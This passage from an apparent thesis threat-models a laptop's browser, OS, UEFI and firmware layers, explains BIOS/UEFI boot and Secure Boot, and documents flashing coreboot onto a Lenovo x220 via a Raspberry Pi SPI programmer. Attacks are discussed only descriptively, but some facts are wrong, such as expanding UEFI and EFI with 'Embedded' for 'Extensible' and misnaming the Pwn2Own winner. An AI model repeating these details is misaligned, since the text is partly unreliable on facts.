reasonable possibilities, we advance the model. Extending the model with more details that were considered as a threat before. One characteristic of TM needs considering:\nYou\u0026rsquo;re never done threat modeling. (Adam Shostack [3] page 403)\nIt is important to set boundaries to a TM or else it will never be finished. Therefore, we will set the scope of our TM to aspects that are in our control. We are going to do the same as Adam Shostack has explained, but instead of thinking what might be lurking behind a billboard, we will devise a simple model that will represent a laptop to allow us to unveil potential flaws within our system. The approach for this is the following:\n$$\\textrm{Modelling} \\rightarrow \\textrm{Identify potential attack surfaces} \\rightarrow \\textrm{Research about Threats} \\rightarrow \\textrm{Revise Model}$$\nModel of a Laptop We will start with a simple mode for the TM that relies on aspects of the described problem from chapter one. We had a laptop that consisted of an OS and running a web browser. The OS was re-installed and at some point, the hardware was considered a problem. For this TM, we will use a layered model approach:\nWe will elucidate the TM first. Our TM consists of three areas to begin with:\nWeb browser Operation system Hardware Since users nowadays only rely on a web browser to do their work, we will focus on web browser. The level of security has changed drastically in the recent years for web browser, as research[24] has shown. Most things happen in the web or ’cloud’3. Web browsers are fast moving environments, with a lot of focus. Their code is open source, well matured and many audits were performed on it.\nProjects like Firefox[25] or Chromium[26] are not free from flaws. One partially interesting contest is the ’Pwn2Own’, hosted by the Zero Day Initiative (ZDI)[27], the security team of HP. ’Pwn2Own’ is an abbreviation for ’Powning to Own’, where the word ’Powning ’is an expression used in the Hacker community for successfully gained privileges (like root or Administrator) on a system. The goal of a participant in this event is to take control of a fully patched device. ZDI provides varying laptops with distinct OSs, each running separate web browsers. When a participant can gain higher access through code execution on a laptop, hence win the devices and money. This year’s winner was Richard Zhu[29]:\nHe used an out-of-bounds (OOB) write in the browser followed by an integer overflow in the Windows kernel.[..] (Dustin Childs [28])\nThe attack aimed at a misbehavior[28] in the memory management of Firefox. The relevant point is that the attacker has gained more privileges on a system by utilizing an integer underflow within the OS kernel. Once something goes wrong inside of the kernel, it eventually leads the code to being executed with the highest permission. Flaws like this are, once found, fixed quickly by both browser vendors and OS vendors. However, this needs to be considered in the TM as well.\nWhy does this matter? Simply put: Imagine browsing a website and clicking on a link. This act would allow an attacker to execute code. This code would exploit the OS kernel to gain higher privileges. At this point, the attacker could do anything with the device.\nAn example[30] of such an attack can be seen when looking at the case of Ahmed Mansoor, a lawyer for human rights in United Arab Emirates, who received an SMS with links to a website. The content of the SMS should have lead to ’secrets’ being disclosed on the website. He did not know the SMS original address and did not open those websites. Instead, he contacted Citizen Lab to analyze and tell him what would have happened if he had open the link:\nHad he done so, Citizen Lab says, his iPhone 6 would have been “jailbroken”, meaning unauthorised software could have been installed.\n’Once infected, Mansoor’s phone would have become a digital spy in his pocket, capable of employing his iPhone’s camera and microphone to snoop on activity in the vicinity of the device, recording his WhatsApp and Viber calls, logging messages sent in mobile chat apps, and tracking his movements,’ said Citizen Lab [..] (BBC[30])\nThis means, this is not just a hypothetical thought; high profile targets are already being attacked4. This represents an extreme example, but how much could a common laptop be affected by flaws?\nIn 2015, media attention focused on the laptops of Lenovo. CVE-2015-2077 was unleashed and revealed that all their laptops shipped with a ’backdoor’ by default. The backdoor was a default SSL Certificate that allows to intercept all traffic, hence any type of security mechanism implemented by vendors of OS and web browsers became invalid. This flaw was called ’Superfish’[31].\nHow was it possible that a vendor could ship such a component on laptops? The Original Equipment Manufacturer (OEM) or the vendors of motherboards, control what is on the hardware before it is shipped to any client. OEM are the producers of hardware. They produce the hardware we are using and composing them of different components. Therefor it is their design what softwares is runs on the laptop. This includes the OS.\nHowever, similar to the ’Superfish’ problem, other problems have been reported. Even worse, laptops were ’bricked’[32] by the OS because vendors had shipped faulty firmware.\nEnhance of the TM We have seen and identified potential attack surfaces. But OS consists of tools and components that could be compromised as the ’Superfish’ flaws have shown. At this point, we need to consider that the OS is not just a simple layer, but a system composed of different layers. The OS kernel was attacked by Zed to gain further access. This aspect needs to be addressed in the TM.\nThe kernel of an OS, like all other tools one needs to run an application, have undergone massive changes in the last decade. While not all of them are open, the defense mechanisms that are implemented are impressive. With the release of Windows 10, Microsoft had reworked the kernel and took an effort to increase security[33].\nA kernel and/or OS can be ’hardened’[34][35], meaning to reduce its surface against attacks or increase the resilience of a system to withstand potential flaws. Many of the flaws demonstrated in the ZDI event might have been mitigated with a hardened OS and kernel. This raises another concern: How is security hardware before any OS is started and what does the computer do when it is starting? Participially with the knowledge that vendors, who are in control of the software that is shipped to customers, are building in backdoors.\nUEFI We are going to debate hardware related technologies. Vendors changed the default firmware from BIOS to UEFI. It is the default technology for modern hardware and will be required by Windows 10. UEFI[36] is an acronym for Unified Embedded Firmware Interface. It is the successor to BIOS and a deviate from EFI. Most modern devices will be shipped with UEFI by default.\nHistory The BIOS standard is limited in its capability to utilize modern processor features. With the development of the Itanium processor, Intel had to devise a solution to address this shortcoming. The initial proposal was called ’Intel Boot Initiative’. To reflect the effort more objectively, it was renamed[38, Page 11] to Embedded Firmware Interface (EFI)[36]. It is intended to permit an OS to interact with the underlying firmware of the hardware, as displayed in figure 2.2. We are going to intertwine this model with the Threat Model from figure 2.1 later.\nEFI provides an environment to execute high-level languages like C[38, Page 11], instead of native assembler. A modularized concept was introduced to allow extending. EFI is able to handle 32 Bit and/or 64 Bit Instructions and can therefore address all of its memory.\nDue to lack of compatibility with existing x86 processors and the fact that the Itanium processors were only obtainable for server systems, they did not succeed[39, page 2] on the market. With AMD’s release of a 64-Bit x86 processor, that respected the compatibility to existing x86 applications, the x86 did remain the predominant processor architecture on the market.\nIntel tried to push EFI as a standard to replace BIOS on the classic x86 market, but ceased the development of it in favor of UEFI. EFI remains in the ownership of Intel, but many aspects of the EFI Standards are adapted by UEFI. EFI was designed for the Itanium processor only but altered later to other processor architecture as well. The UEFI Forum[36] adapted the EFI and developed it further[38, page30].\nBIOS Before we take a look into the UEFI architecture in-depth, we will make an introspective to the BIOS and how it boots a system. While UEFI has become the default firmware on modern computers, it has actually not replaced BIOS. Instead, BIOS became a legacy system of UEFI. This way, UEFI ensures compatibility with OSs like MSDOS.\nThe notion ’BIOS’ was defined by Gary Kildall in 1975[40]. His idea was quite simple: Having a pieces of firmware that initializes the hardware. Once all hardware is initialized, the firmware ceases and an OS takes over. Gary Kildall devised this for his development of the CP/MOS, later also known as ’DOS BIOs’ or ’IBMBIO.COM’. With DOS taking the lead in the market, latter expression was more established. The first version of a BIOS had no graphical interface. Only in case of an error, some type of informative message was shown, sometimes with an error noise.\nIn the 1990s, a need for visual surfaces was addressed for the first time. BIOS Software was extended with a GUI to allow consumers to change configurations. After some time, more features were ’added’ to the BIOS. However, this only showed downsides of it. BIOS cannot be extended. It has strong limitations: BIOS can only address up to 1 MB of memory or storage due to the fixation to the ’Real Mode’ of a processor.\nOperating Modes The ’Real Mode’ mentioned earlier in the chapter requires some explanation. Processors have different ’Operating Modes’[43, page 11]. These ’Operating Modes’ are states in which the processor acts with different capabilities. These modes are historically grown. With each generation of processors, new feature sets were added. To ensure backwards compatibility, the feature sets were packed with the different modes, so that older software would remain working with a previously introduced set of capabilities.\nAs a researcher[41] has shown in his work, it is possible to run software developed forty years ago on modern processors. Windows has disabled the 16-Bit subsystem with the release of 64-Bit based Windows OSes[42]. However, the processors remain capable of doing so. A program that can set the right CPU flags can again be run within the 16-Bit mode of the CPU.\nReal Mode\nProtected Mode\nVirtual-8086 Mode\nSystem Management Mode\nLong Mode\nReal Mode The ’Real Mode’[43] resembles the primitive state of an Intel 8088 processor. This mode can only address up to 1MB of memory and storage. BIOS is limited to this mode because it was developed for the processor with this feature at that time.\nProtected Mode Newer models of Intel’s processors were extended with a ’Protected Mode’. With the expansion of features ,the processors became more powerful and were able to address more than 1MB of memory. Not all programs were able to handle this bigger address space. Within the ’Protected Mode’, the memory was segregated into segments.\nVirtual-8086 Mode With the usage of the ’Protected Mode’, another problem was arising, the need for programs to run within a ’Real Mode’ environment, particularly within a DOS program. For this, Intel introduced the ’Virtual-8086 Mode’, which allows a program to execute as if it was running in ’Real Mode’. This allows once more backwards compatibility.\nSystem Management Mode The SMM (System Management Mode) is used in different ways. Its purpose is to control hardware related subsystems e.g power management. It varies in the fact that it is not a normal operating mode as the mode introduced before. It owns many privileges which makes this subsystem interesting for an attacker. SMM can access memory beyond the control of an OS and modify memory without its consensus. Even OS like OpenBSD with specific hardening can be subverted.[50]\nLong Mode This mode was introduced by AMD[43] to allow the usage of 64-Bit addressing and instructions, whereas Intel was attempting to restart the process architectures with the Intanium Platform, which failed. AMD just extended the instruction set of the x86 processor.\nBoot process When a processor is powered on, it is going to initialize some things that are integrated into the silicium. For example, it will reset all the data in the registers and set them to the default values. The CPU will be set up in the ’Real Mode’.\nOnce the processor is finished with the initializing phase, it is going to load instructions from storages. This first loadable instruction is located in the ’Reset Vector’[44, page 113]. Basically, the ’Reset Vector’ is a pointer or memory address in which the processor can check for further instructions. In most cases, a simple jmp instruction is located here that will point to some address within the storage.\nA code block from an original BIOS can be seen in code listing 2.1. One should notice that at this stage of the boot process it is only possible to execute assembler code; because the processor was rested or powered we deal with a ’cold boot’. This means we do not have any hardware configured like the main memory. Hence, paradigms like a Stack or Heap are not in place yet.\nF000:FFF0 jmp far ptr bootblock_start ......... F000:FFAA bootblock_start: FF00:FFAA jmp exec_jmp_table ......... F000:A040 exec_jmp_table: F000:A040 _CPU_early_init F000:A043 ;----------------------------------------------------- F000:A043 F000:A043 _j2: F000:A043 jmp _goto_j3 ......... ......... ; Other jump table entries ......... F000:A08B _j26: F000:A08B jmp setup+stack F000:A08E ;----------------------------------------------------- F000:A08E _j27: F000:A08E call near ptr copy_decomp_block F000:A091 call sub_F000_A440 F000:A094 call sub_F000_A273 F000:A097 call sub_F000_A2EE F000:A09A retn In this code block we have a good example of a limitation. The first line is the Reset Vector, that leads to the execution of code of the ’bootblock’. The bootblock is the first code from the BIOS in which the processor sets up some basic. The code also includes the last function in the line: copy_decomp_block. This block will decompress the code.\nWhy does it need to decompress anything? Simple, the ’Real Mode’ is limited to one MB of space, but BIOS has grown with time. To program more effectively, the developer of BIOS came along with some ’hacks’. For instance, they implemented some of the registers of a processor with a Stack, allowing to make function calls in assembler. Another one of these ’hacks’ was the usage of the ’Unreal Mode’[45][46]. This mode allows to use up to 4GB of memory while reaming with the 16 Bit instruction set. These ’hacks’ should constitute the limitation of the BIOS and why there is a benefit of using UEFI.\nmØ This will lead to the POST process, the ’power-on self-test’ in which all hardware that was found would be initialized. Some peripherals like NICs or the Embedded Controller (EC) need to load an OptionROM. Once this phase is done, BIOS will load the Boot loader of an OS.\nBoot Loader Once the hardware is initialized by BIOS, control will case to the next stage to invoke a ’bootloader. The boot loader has to setup the processor to allow the OS kernel to be loaded with long mode. At this point, we can see differences between UEFI and BIOS. In case a failure happens, UEFI can fall back to a shell and lead the user to resolve the problem. Therefore, having a boot loader within the ROM seems useful.\nUEFI Architecture The architecture of UEFI is formed out of a complex multistage boot process[38, page 249]. The image5 in figure 2.4 represents this process. The first row in figure 2.4, the row on the left side, is called ’SEC’ stage.\n’SEC’ stands for Security. This stage belongs to the pre-EFI (PEI) phase and in this stage the platform specific code begins to execute. In short the system firmware will be initialized. Also, the registers of the processor will be configured as RAM. This act is named ’Cache as Ram’(CAR)[44, page 108] and is necessary to allow high-level language like C to be executed without initialized memory.\nOnce the SEC stage is finished, a dispatcher will be called that invokes the PEI phase. This stage can be seen on the second row from left in figure 2.4. The main memory will be initialized. Subsequently, the content of the CAR will be moved to the main memory. After the PEI stage is finished, another dispatcher will be invoked that leads to the transition into the Driver Execution Environment (DXE), seen in figure 2.4 in the third row from the left.\nWithin the DXE phase, a high-level code can be executed independent of the underlying platform. It sets up the code for SMM and when enabled, secure boot will be enforced. At this stage, features can be accessed. Hardware like the PCI Bus and OptionROM will be loaded. At this stage, most of the hardware should be accessible, including the network card and the EFI shell.\nOnce the DXE[49] phase is finished, UEFI will transit to the Boot Device Selection (BDS), as shown in the fourth row in the graph 2.4 from the left side. The BDS is a file from the DXE encapsulated. It will call an exit function of the DXE and remove every code besides the UEFI run time environment. At this point, the actual signature of the firmware is validated. Once done, it will call the boot loader from the OS and move to the Transient System Load (TSL).\nIn chapter Secure Boot, we will take a look at the ’Secure Boot’. The Unified EFI Forum releases an open source implementation called ’tianocore’[76]. It is the reference implementation of the UEFI standard.\nSecure Boot The core feature of UEFI is ’Secure Boot’ (SE). SE allows the usage of a cryptographic signature to verify underlying components, like the firmware. The signature will be checked against a Public Key Infrastructure (PKI).\nAs part of the PKI, a Platform Key (PK) will be generated. The PK acts as the root of trust. OEMs will be in control of the PK. Additionally, all keys that will be used later are validated against the PK.\nAnother set of keys will be generated, the ’Key Exchange Key’ (KEK). This set of keys will be used to validate the signature database (db) or the revoke signature database (dbx).\nThe KEKs will be validated from the PK. The KEK protects the db/dbx from alteration. The db contains a list of signatures of programs (DXE driver and apps) that are allowed to be executed.\nThere is a difference between ’Secure Boot’ provided by UEFI and Windows’ ’Secure Boot’[52]. Windows’ relies on the UEFI one. Because of this decency, Microsoft has developed guidelines to ensure that Windows Secure Boot works with the UEFI Secure Boot. As can be seen in figure 2.5, the underlying layer validates the upper one.\nFlaws in UEFI and Secure Boot Because UEFI is responsible for the first instruction that is being executed, we will need to ensure that this is secure. Yet, UEFI is full of flaws. For once UEFI is backwards compatible, this implies that a user can use a ’legacy modus’[96]. This legacy modus is similar to the classic BIOS. This is necessary to ensure compatibilities to old OSs like DOS. But instead of replacing BIOS, UEFI extends BIOS with a more complex solution.\nFurther issues are that UEFI does not implement[51] any type of security mechanism like Address Space Layout Randomization (ASLR) or setting a NX bit for the memory. Each code that will be executed has the high privilege on predictable positions within memory. While Intel provides papers on how to implement UEFI securely, many vendors do not seem to care.\nWhile there is an open source implementation (as can be read in chapter UEFI) of the UEFI standard, fixes within this implementation are not pushed directly to the OEMs, except Apple. As shown in figure 2.7, an update from the CPU vendor to the OEM needs to pass the Institute for Business Value (IBVs), the Original Design Manufacturer (ODM), and then eventually the OEM. This leads to the problem that fixes within the original UEFI code of ’tianocore’ might never reach the end-user. Even when updates occur, the end-users would have to update the software on their own.6\nIn the end, UEFI introduces a huge complexity with its standard, even hardware vendors have problems complying to. While the design might be fine, most of the flaws lie in implementation. Furthermore, many vulnerabilities have been existing for years within the reference implementation of the UEFI without being addressed. Vendors tend to not go along with recommendations in regards to security from Intel. UEFI forces them to take a trade-off between being secure or fast booting and the vendors tend to take latter one[96].\nThought needs been given to the UEFI Secure Boot, considering that every vendor implements it in their own matter, not always complied to the requirements Windows has for its Secure Boot. As attacks have shown, the SPI Flash Chip remained alterable, allowing an attacker to alter content of the SPI Flash Chip. This allowed to corrupt[48, page 65] the PK and put the UEFI into ’setup mode’. Once it is in setup mode, Secure Boot is disabled and an arbitrary driver can be installed. Aside from this issue, Microsoft has its own questionable pragmatics[53] in regards to the usage of Secure Boot.\nRevised Threat Mode Now is the time to revise the TM we created and build up on it. Before we do this, we will take a look on some aspects research has shown. We will take the model from figure 2.2 .\nIn figure 2.8, an improved version of the TM can be seen.\nWeb browser - has layers of sandboxing in place. Kernel - Has been hardened against attacks. UEFI/BIOS - Almost no control about. Firmware - No control. Hardware - No control. When we take a look at what type of research is out there, we will notice that as we go closer to the hardware, the fewer resources we get. Web browser, OS and Kernels have been hardened for the last decade to withstand many different types of attacks. They are universally more exposed to users and therefore being attacked more often. Special attacks were made and resilience is in place.\nWhile flaws exist in all parts of this model, one should consider the lifetime of a flaw and how quickly they are solved. Flaws that are found in web browser are fixed within days. But more importantly, they are distributed to the users in almost the same time.[24, page 268]\nFlaws in Operating Systems, can live up to 5[54] or 7[55] years. Some are fixed within days, some take half a year. It depends on the vendors. But OSes are fixing their flaws in general. Those fixes are distributed in releasable time to the users. Not every user is installing them; however, this situation has improved over the years. (Compared to Windows XP time).\nFlaws in hardware persist even longer. The Meltdown/Spectre[64][65] vulnerability has remained undetected for 20 years[56] and even months after the disclosure, not all processors have been addressed. There are no processors that are not affected and it might take some years before processors are released without the flaws. Intel has an interesting way to address these flaws: They update a special firmware, called microcode[57], that mitigate the flaws on the hardware.\nSimilar can be said about UEFI/BIOS related firmware. Even when flaws are unveiled, this does not imply that those flaws are fixed. OS and web browsers have developed strategies to patch effetely, in contrast to hardware and firmware[96]. Also, the User is responsible for installing updates for their firmware. But how many users do so is unknown. Flaws that are found and reported to Intel might lead to a ’fix’[59]. But these flaws are not distributed to the users, but to the OEMs and it is not certain that this vendor will release/push an update to the clients.\nThere is very little information about firmware related issues. We can expect that flaws are not patched or at least not communicated.\nConclusion The main goal of a Threat Model is to find flaws within our asset. While we could keep Threat Modeling, we will stop to model now. To keep in reasonable costs(see figure 1.1)7. But how can we address found flaws? Considering the current model (figure 2.9) we can only address one aspect: The UEFI/BIOS layer. The firmware underneath the UEFI/BIOS layer is mandatory for the hardware to operate, since hardware itself cannot be changed.\nMatrosov[61] has suggested (figure: 2.9) that the firmware is the weakest link in the current hardware, even with features like Secure Boot.\nWe come back to the question of the costs. How much one is willing to spend in order to attack someone and how much one does want to invest to avoid being attacked. Luckily, we can replace the obnoxious UEFI/BIOS with a proper solution: coreboot[96].\nCoreboot Coreboot is an open source project to boot a computer. The purpose of the project is to replace the property components like BIOS/UEFI from a motherboard. Coreboot will be installed into the SPI Chip of a computer and is then responsible for initializing the hardware.\ncoreboot is an extended firmware platform that delivers a lightning fast and secure boot experience on modern computers and embedded systems. As an Open Source project it provides auditability and maximum control over technology. (Welcome text from coreboot.org [[4]]@coreboot)\nHistory of coreboot Coreboot was founded in 1999 by Ron Minnich from the ’Los Alamos National Labs’ (LANL)[ 1][102]. The project made its first appearance as ’LinuxBIOS’, thanks to the idea of replacing the BIOS with Linux. By letting Linux take over the necessary hardware initializations, Ron Minnich wanted to save time during the boot process. It is a matter of fact that the BIOS is taking a long time to set up hardware and slows down the boot process. For example, the enumeration of PCI devices on the bus is done twice, first by the BIOS and thereafter by the OS, whereas a gPXE interface needs several seconds to minutes to be initialized correctly by the BIOS.\nThe LANL operated clusters of about 8000 nodes and ran into many difficulties with BIOS, issue like: ’No Keyboard was found, please press F1 to continue’[102]. Think about it, having thousands of nodes and it becomes necessary to connect a keyboard to press F1 to get the systems booting. Even worse, BIOS and UEFI are difficult to extend in their functionalities. A Linux on the other hand can be extended quite easily. The situation becomes worse when exotic hardware like InfiniBand is at hand.\nOne side effect of the usage of Linux instead of BIOS was that the hardware operated more reliably[102]. With LinuxBIOS, the hardware was more flexible and faster than systems with the default ROM. Also, the time necessary to boot the hardware was diminished, a system could be rebooted within 3 seconds[69]. Something that is desirable in case of a system failing in the cluster that needs to be reset.\nOver the years, the project moved away from the initial concept of installing Linux onto the ROM. They moved to the approach to boot the hardware only. In 2008, LinuxBios was renamed to Coreboot, for reasons like marketing and preventing confusion[58].\nArchitecture of coreboot In the chapters UEFI and BIOS the boot process was explained. We will do the same with coreboot. It has only four stages:\n$$\\textrm{bootblock} \\rightarrow \\textrm{romstage} \\rightarrow \\textrm{ramstage} \\rightarrow \\textrm{payloads}$$\nWhen Coreboot starts, it passes four stages[1, Building coreboot with Intel FSP, p. 76] before OS will be loaded. When the processor is powered on, the first instruction from the processor will execute the bootblock of coreboot.\nCBFS The Coreboot File System (CBFS)[68] is not a real File System (FS) in the classic sense. Rather than being a FS, it defines structures that are in its design related to a FS. It defines the format in which data is stored on the SPI Chip. All data is located within CBFS blocks in binary format.\nOne important block in the CBFS is the ’Master Header’. It is located within the bootblock. The ’Master Header’ contains vital information that is fundamental for coreboot. This information is necessary for utilities at build time to work with. It helping to calculate the physical address on a normal x86 system. This simplifies the process of find the location during runtime.\nAll other blocks of the CBFS define as ’Components’ blocks and are located behind the ’Master Header’. Within the Components, different data types exist, declared with a header before the data with the types of ’Stages’ and ’Payloads’. Data that consists of independent binaries will be stored in a structure called SELF (Simple ELF)[70]which is of type ’Payloads’. The ’Stages’ are loaded during the boot process and consist of a single blob of data in binary form.\nbootblock The primary purpose of the bootblock[71] stage[ 1] is to put the processor into the 32-bit protected mode and prepare the CPU to be configured as CAR[44, page 123]. The bootblock is placed at the last 20k of the SPI Chip. In Listing 3.1, the first instructions are shown. The computer will be executing the Reset Vector and point to a specify address in memory.\n.section \u0026quot;.reset\u0026quot;, \u0026quot;ax\u0026quot;, %progbits .code16 .globl _start _start: .byte 0xe9 .int _start16bit - ( . + 2 ) .previous The code will jump to the _start16bit function. Several important things are done here, for example setting up the Global Descriptor Table (GDT) and putting the processor into the 32-bit protected mode. Afterwards, the code jumps to the _start32bit function. From there, execution is continued in the chipset related romstage.\nromstage At the romstage[1, page 80], the processor performs ’execution in place’ (XIP) with assembler code, because the main memory is not available yet. The assembler code in the bootblock stage is generic, but the code in romstage stage is platform specific. The first step in this stage is to configure the processor to use CAR. Hereafter, a minimal environment for running C is set up.\nOnce the stack and heap are configured, the processor is able to execute simple C code. The next calls are for the initialization of the DRAM. Setup of DRAM is complex and developing this in a language like C is simpler. When the memory is configured, the existing entries in the CAR will be copied into the main memory. With this step, the romstage ends and the ramstage begins.\nramstage At the ramstage[1, page 81], the basic functions of a system are initialized. The system has access to the main memory and can execute code. The peripherals are configured now. That means any I/O related devices will be enumerated, further application-processors and the SMM are prepared.\nThe ramstage uses a state machine to run the hardwaremain function. The ramstage utilizes a device tree for this. The device tree is a list of legacy and PCI devices that are connected to the system, aligned in a hierarchical structure. Each motherboard needs to configure the device tree before it can be compiled. This file is called devicetree.cb[1,page 82]. Additional devices will be appended during run time to the device tree once the state machine finds them.\nWhen the enumeration is done, the SMM is configured. Legacy and ACPI tables are set up. Then, the SMM will be locked. This marks the end of the ramstage. Coreboot will seek for the CBFS and load the located payloads.\npayload The payload[1, page 82] stage marks the last stage of coreboot. Within this stage, none-coreboot related functions are executed. That means it will be at largely used to call an external program to start up an OS. Coreboot is able to store programs, like the Linux kernel within the SPI Chip.\nPayloads are usually projects separate from coreboot. Many payloads support an integration to coreboot. The default payload of coreboot is SeaBIOS. It is possible to integrate with the cbfstools common ELF based binaries. For applications that are not supported for coreboot, the libpayload is supporting the integration process.\nPossible payloads Possible payloads are:\nSeaBIOS - A classic BIOS type interface UEFI via Tinocore[76] Linux Kernel SeaBIOS SeaBIOS[72][75] represents a classical 16-Bit based x86 BIOS implementation that is well adjusted to coreboot. It is able to read CBFS and other payloads. It can also load Windows by chaining different boot loaders.\nSetup Coreboot To get coreboot installed on a laptop, it needs to be build. There are not binary builds at your disposal. For this, the source code is necessary. Coreboot has a build chain that will be installed first; we only rely on i386, not all platforms need to be built. After the tool chain has been built, the configuration needs to be set. It is recommended to test the tool chain first, by building an image for qemu. Afterwards, the hardware related configuration needs to be done. To get all required aspects for the build, the image from the SPI chip needs to be extracted. Once all aspects are present, coreboot can build an image that can be written onto the SPI Chip.\nAt this point, we will checkout the source code from coreboot with git[77]. The latest release[73] of coreboot was used. The code was forked[78] to ensure a constant code base.\ngit clone https://github.com/coreboot/coreboot git submodule update --init --checkout make menuconfig Coreboot uses the same tool to create its configuration file as the Linux kernel. By default, coreboot is configured to build an image for qemu. We can use qemu[79] to test the build chain from coreboot. No changes in the configuration are necessary to build a ROM for qemu.\nmake crossgcc-i386 CPUS=2 The log for the build can be seen in the appendix. Once the build is done, qemu can be used to start VM with a coreboot ROM.\nqemu-system-x86_64 -bios build/coreboot.rom -serial stdio The output can be seen in figure 3.3.\nWe have a working build system that can be used to make coreboot.rom files and start them. The next step is to adapt coreboot to hardware and run it on the hardware.\nIssues During the first setup of the coreboot, some problems occur that are worth mentioning.\nBuild environment On an archlinux based Linux distribution, coreboot was not able to be built properly. The GCC (8.1) compiler was too new and therefore not supported. To address this issue, a virtual machine with Ubuntu (16.04 LTS) was used. The problem is known to coreboot developers and a branch exists that is trying to resolve it.\nInconsistent Documentation The coreboot project moved its default documentation system from a media wiki into the source code directly. The documentation will be rendered with python using Sphinx. The documentation is hosted by ’Read the Docs’[73]. This leads to the problem that the main documentation is inchoate and lacks many of sites of information. On the other hand, the wiki consists of many different entries. These entries might refer to an earlier version of coreboot. Sometimes, the information found in the wiki is contradictory to the actual state.\nNo hardware support The author intended to use a Lenovo x240. This type of device is not supported[74] by coreboot, as can been seen in figure 3.4.\nHardware Something interesting should be taken into account when considering newer hardware like the Lenovo x240: ’Intel Bootguard’.\nIntel Bootguard When Intel realized[2, page 145] that people were abusing and modifying their firmware in a matter they did not want, they took action. Especially with the implementation of TPM and UEFI, the firmware was more an attack vector8[61][62] than ever before. This was addressed in the ’Trusted Execution Technology’.\nBut how can we ensure that the hardware will only operate with the correct firmware? Intel devised a solution for the problem: Each CPU has a register to hold a value. Once the value is set, it will be ’fused’ into it, making its value persistent and unchangeable. This fuse is named: ’field programmable fuses’[2,page 150]. The value will be a cryptographic RSA only the OEM has the private key for.\nThe OEM needs to make further adjustments to the boot process to secure the software cryptographically. Once adjustments are set, the firmware will cryptographically verify the installed firmware image. The firmware will be checked against the valued fused into the hardware. When the verification fails, the computer will not start. This feature is called: Intel Boot Guard (IBG or BG)[2, page 51].\nHowever, Intel lets the OEM decide if they want to utilize this feature or not. The problem that follows that result from this is that coreboot cannot be installed without a valid signature of the OEM once IBG was enabled. Many devices nowadays are shipped with BG features enabled by default, denying the use of any other firmware[63, page 54].\nThe coreboot project provides some tools to check the state of a laptop in regards to IBG. intelmetool allows access to get the state of Bootguard.\nsudo ./intelmetool -b ... ME Capability: BootGuard : ON ME Capability: BootGuard Mode : Verified \u0026amp; Measured Boot On a Lenovo x240, a successor to the x230 and x220, the Intel Bootguard feature is activated, denying anyone but Lenovo to run any type of firmware on it. We could see it also on the logo outside of the laptop with ’vPro’[106, chapter ’Intel Boot Guard’].\nx220 Since the Lenovo x240 has Intel Bootguard enabled, another laptop was purchased to install coreboot. A Lenovo x220i will be used. The x220[66] is a device known to work well with coreboot and have full support, as can be see in figure 3.4.\nOther devices of the ’X’ series can be used, for example the x200. The x200 was certificated[67] by the FSF as free as possible with coreboot. However, the x220i will be used because it also is supported by the Heads project, otherwise a x200 would have been chosen. The x220 was installed with Ubuntu 16.04.\nExternal SPI Programmer Another precaution we need to take care of is an external SPI Programmer. For the initial installation of coreboot on a SPI Chip, an SPI Programmer is necessary. A Raspberry Pi A+ was configured to be a SPI Programmer(Seen in figure: 3.7). Because the SPI Chip on the laptop is locked down, it is not possible to alter the content during run time. It is also obligatory to extract the content of the SPI Chip.\nThe Raspberry Pi A+ will be connected to a breadboard with the GPIO Pins. Then, a ’WINGONEER SOIC8 SOP8 Test Clip’ will be used. The clamp will be attached to the SPI Chip, without the risk that a cable becomes displaced. Before any data can be read or written, we have to test the clamp. By adding a wire between the MOSI and the MISO output of the clamp, we can validate that the SPI protocol is working as intended. The tool spidev_test[80] was used for the validation, the result is documented in listing 3.6.\nroot@raspberrypi:~# ./spidev_test -D /dev/spidev0.0 spi mode: 0 bits per word: 8 max speed: 500000 Hz (500 KHz) FF FF FF FF FF FF 40 00 00 00 00 95 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF DE AD BE EF BA AD F0 0D The next step is to expose the SPi Chip on the Lenovo x220i and attach the clamp.\nExposing the x220 The SPI Chips are located directly on the motherboard of the x220. Hence, it is mandatory to dismantle the x220. The SPI Chip is located beneath the touchpad, right next to the keyboard.\nFirst, we need to remove the screws from the bottom.\nOnce the screws are unscrewed, the x220i can be turned and the keyboard can be removed. By carefully pushing the keyboard up, in direction of the screen, we will slide the keyboard out of its enclosure.\nThe keyboard is connected to the motherboard with a thin wire, this wire needs to be removed. This is optional.\nThe wire has a small plug on the end, right next to the motherboard. This can be unplugged.\nThe last step is to push upwards the entry case inside of which the touchpad is embedded.\nThe removal of the touchpad will expose a fine plastic foil under which the motherboard sits. To access the SPI Chip, it is necessary to strip the plastic foil.\nExtraction of the original firmware With the clamp attached to the SPI Chip, it is possible to interact with the SPI Chip directly. The x220 is disconnected from any power source, also the battery is removed from the laptop. At first, some reads of the content of the SPI Chip will be performed. When the data that was read from the SPI Chip are alike, we can use the read data as backup. This allows to test the SPI Programmer for inconsistencies and produces a backup image of the original firmware to roll-back in case we have to. Another tool for this type of work is necessary:’flashrom’[80][81]. This utility is used for writing and reading an images from the SPI:\nroot@raspberrypi:~# flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=512 \\ -r x220.rom flashrom p1.0-81-g0b59b0d on Linux 4.14.34+ (armv6l) flashrom is free software, get the source code at https://flashrom.org Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). Found Winbond flash chip \u0026#34;W25Q64.V\u0026#34; (8192 kB, SPI) on linux_spi. Reading flash... done. flashrom discovers the vendor ’Winbond’[@winbond] from the SPI Chip, its size 8192 kB and the revision of the component W25Q64.V as we can see in listing 3.7. To ensure that the SPI is reading correctly it is recommended to re-read the content of SPI at least three times and then validate that the hash values of the read images are the same:\nroot@raspberrypi:~# ls -l *.rom -rw-r--r-- 1 root root 8388608 Jun 7 13:29 x220_2.rom -rw-r--r-- 1 root root 8388608 Jun 7 13:32 x220_3.rom -rw-r--r-- 1 root root 8388608 Jun 7 13:27 x220_1.rom root@raspberrypi:~# sha1sum *.rom 8ba448608142debd8d2e14f67794f067e8c4ae01 x220_2.rom 8ba448608142debd8d2e14f67794f067e8c4ae01 x220_3.rom 8ba448608142debd8d2e14f67794f067e8c4ae01 x220_1.rom As we can see in listing 3.8, the SPI operates as intended.\nSPI Chip Partitioning Layout The next step is to run the ifdtool tool. ifdtool will extract the partition layout of the existing firmware. This is necessary to place the coreboot firmware correctly within the SPI Chip. For this, we need to checkout the git from coreboot and go to the folder coreboot/util/ifdtool/, run make and execute the file:\nroot@raspberrypi:~# ifdtool -x x220.rom File x220.rom is 8388608 bytes Flash Region 0 (Flash Descriptor): 00000000 - 00000fff Flash Region 1 (BIOS): 00500000 - 007fffff Flash Region 2 (Intel ME): 00003000 - 004fffff Flash Region 3 